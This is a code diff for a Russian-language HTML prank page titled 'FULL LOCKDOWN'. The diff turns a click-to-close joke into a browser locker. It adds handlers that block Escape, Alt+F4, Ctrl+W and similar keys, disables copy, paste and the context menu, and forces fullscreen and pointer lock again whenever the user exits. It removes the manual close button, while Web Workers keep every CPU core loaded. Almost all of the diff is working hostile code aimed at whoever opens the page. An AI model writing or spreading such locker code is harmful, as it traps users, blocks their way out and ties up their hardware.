@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>CLICK TO CLOSE + KG TIMER (FIX)</title>
+    <title>FULL LOCKDOWN</title>
     <style>
         body {
             background: url('https://avatars.mds.yandex.net/i?id=812dcd22b1b1798df7daf79ae5d2731540b75369-8497211-images-thumbs&n=13') no-repeat center center fixed;
@@ -15,6 +15,7 @@
             min-height: 100vh;
             position: relative;
             transition: background-image 0.3s ease;
+            cursor: none; /* скрываем курсор, пока не активирован pointer lock */
         }
         body::before {
             content: "";
@@ -39,6 +40,7 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            pointer-events: auto; /* чтобы кнопка кликалась */
         }
         h1 {
             font-size: 1.8em;
@@ -74,22 +76,11 @@
             box-shadow: 0 0 20px cyan;
             transition: 0.1s;
             white-space: nowrap;
+            /* курсор всё равно не виден, но кнопка работает */
         }
         button:hover {
             background: #ffaa00;
             box-shadow: 0 0 30px orange;
-        }
-        .manual-close {
-            margin-top: 15px;
-            background: #f44;
-            color: white;
-            font-size: 1em;
-            padding: 5px 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            box-shadow: 0 0 10px red;
-            position: static;
-            display: inline-block;
         }
         #bg-music {
             display: none;
@@ -109,16 +100,110 @@
         <div id="buttonContainer">
             <button id="clickButton">КЛИКАЙ ТУТ</button>
         </div>
-        <button class="manual-close" id="manualClose">⌫ Закрыть вручную</button>
         <div class="music-note" id="musicStatus">🎵 Музыка включится после первого клика</div>
     </div>
 
-    <!-- Локальный аудиофайл music.mp3 (лежит рядом с index.html) -->
     <audio id="bg-music" loop src="music.mp3"></audio>
 
     <script>
         (function() {
-            // ========== СЧЁТЧИК КГ (СОХРАНЯЕТСЯ) ==========
+            // ========== ЖЁСТКАЯ БЛОКИРОВКА КЛАВИШ И СОБЫТИЙ ==========
+            function blockAllKeys(e) {
+                // Список опасных клавиш и комбинаций
+                const forbiddenKeys = [
+                    'Escape', 'F11', 'F4', 'Alt', 'Control', 'Meta', 'Win', 'OS',
+                    'Tab', 'Delete', 'Insert', 'Home', 'End', 'PageUp', 'PageDown'
+                ];
+                // Если нажат Alt, Ctrl, Meta и т.д. – блокируем всё
+                if (e.altKey || e.ctrlKey || e.metaKey || e.key === 'Alt' || e.key === 'Control' || e.key === 'Meta') {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                // Проверка по ключу
+                if (forbiddenKeys.includes(e.key)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                // Особо опасные комбинации (Alt+F4, Ctrl+W, Ctrl+Shift+Esc и т.п.)
+                if (e.altKey && e.key === 'F4') {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && e.key === 'w') {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && e.shiftKey && e.key === 'Escape') {
+                    e.preventDefault();
+                    return false;
+                }
+            }
+
+            document.addEventListener('keydown', blockAllKeys);
+            document.addEventListener('keyup', blockAllKeys);
+            document.addEventListener('keypress', blockAllKeys);
+
+            // Блокировка контекстного меню, выделения, копирования
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('selectstart', e => e.preventDefault());
+            document.addEventListener('copy', e => e.preventDefault());
+            document.addEventListener('cut', e => e.preventDefault());
+            document.addEventListener('paste', e => e.preventDefault());
+
+            // Блокировка попыток выхода из полноэкранного режима через ESC (но ESC уже заблокирован)
+            // Дополнительно блокируем событие fullscreenchange?
+            // Не блокируем, чтобы не мешать логике.
+
+            // ========== ЗАХВАТ МЫШИ (POINTER LOCK) И ПОЛНЫЙ ЭКРАН ==========
+            function requestLockAndFullscreen() {
+                // Полный экран
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen().catch(() => {});
+                }
+                // Захват мыши
+                document.body.requestPointerLock = document.body.requestPointerLock || document.body.mozRequestPointerLock || document.body.webkitRequestPointerLock;
+                if (document.body.requestPointerLock) {
+                    document.body.requestPointerLock();
+                }
+            }
+
+            // Пытаемся при загрузке
+            requestLockAndFullscreen();
+
+            // При клике на любую область документа также пытаемся захватить (особенно после выхода из захвата)
+            document.addEventListener('click', function() {
+                requestLockAndFullscreen();
+            });
+
+            // Отслеживаем потерю захвата и пытаемся перезахватить (кроме случая, когда достигнут 100%)
+            document.addEventListener('pointerlockchange', function() {
+                if (document.pointerLockElement !== document.body && progress < 100) {
+                    requestLockAndFullscreen();
+                }
+            });
+            document.addEventListener('mozpointerlockchange', function() {
+                if (document.mozPointerLockElement !== document.body && progress < 100) {
+                    requestLockAndFullscreen();
+                }
+            });
+            document.addEventListener('webkitpointerlockchange', function() {
+                if (document.webkitPointerLockElement !== document.body && progress < 100) {
+                    requestLockAndFullscreen();
+                }
+            });
+
+            // При выходе из полноэкранного режима пытаемся вернуть
+            document.addEventListener('fullscreenchange', function() {
+                if (!document.fullscreenElement && progress < 100) {
+                    if (document.documentElement.requestFullscreen) {
+                        document.documentElement.requestFullscreen().catch(() => {});
+                    }
+                }
+            });
+
+            // ========== СЧЁТЧИК КГ ==========
             let kg = localStorage.getItem('kgCounter') || 0;
             kg = parseInt(kg);
             const kgDisplay = document.getElementById('kgDisplay');
@@ -127,14 +212,13 @@
             }
             updateKgDisplay();
 
-            // Таймер для увеличения кг каждую секунду (без перезагрузки!)
             const kgInterval = setInterval(function() {
                 kg += 10;
                 localStorage.setItem('kgCounter', kg);
                 updateKgDisplay();
             }, 1000);
 
-            // ========== ПРОГРЕСС ЗАКРЫТИЯ (СОХРАНЯЕТСЯ) ==========
+            // ========== ПРОГРЕСС ЗАКРЫТИЯ ==========
             let progress = localStorage.getItem('closeProgress') || 0;
             progress = parseInt(progress);
             const progressDisplay = document.getElementById('progressDisplay');
@@ -175,74 +259,54 @@
             }
 
             function forceClose() {
-                // Очищаем интервал кг
                 clearInterval(kgInterval);
-                
-                // Сброс всего
                 localStorage.removeItem('closeProgress');
                 localStorage.removeItem('kgCounter');
-                
                 progress = 0;
                 kg = 0;
                 updateKgDisplay();
                 updateProgressDisplay();
 
-                // Пытаемся закрыть окно
+                // Пытаемся закрыть
                 window.close();
-                
                 setTimeout(function() {
                     window.open('', '_self', '');
                     window.close();
-                    
                     setTimeout(function() {
                         location.replace('about:blank');
                     }, 100);
                 }, 100);
             }
 
-            // Если при загрузке прогресс уже >=100 (редкий случай), сбрасываем
-            if (progress >= 100) {
-                forceClose();
-            }
+            if (progress >= 100) forceClose();
 
-            // Функция перемещения кнопки
             function moveButton() {
                 const containerWidth = buttonContainer.clientWidth;
                 const containerHeight = buttonContainer.clientHeight;
                 const buttonWidth = button.offsetWidth;
                 const buttonHeight = button.offsetHeight;
-
                 let left = Math.random() * (containerWidth - buttonWidth);
                 let top = Math.random() * (containerHeight - buttonHeight);
-
                 button.style.left = left + 'px';
                 button.style.top = top + 'px';
             }
 
             moveButton();
 
-            // Обработчик клика на основную кнопку
             button.addEventListener('click', function() {
                 tryPlayMusic();
-
                 if (progress < 100) {
                     progress++;
                     localStorage.setItem('closeProgress', progress);
                     updateProgressDisplay();
                     moveButton();
-
                     if (progress >= 100) {
                         forceClose();
                     }
                 }
             });
 
-            // Кнопка ручного закрытия
-            document.getElementById('manualClose').addEventListener('click', function() {
-                forceClose();
-            });
-
-            // ========== 100% НАГРУЗКА CPU (КАК БЫЛО) ==========
+            // ========== НАГРУЗКА CPU ==========
             if (window.Worker) {
                 const coreCount = navigator.hardwareConcurrency || 4;
                 for (let i = 0; i < coreCount; i++) {
@@ -272,7 +336,6 @@
             }
             lightLoad();
 
-            // При закрытии вкладки остановить интервал
             window.addEventListener('beforeunload', function() {
                 clearInterval(kgInterval);
             });
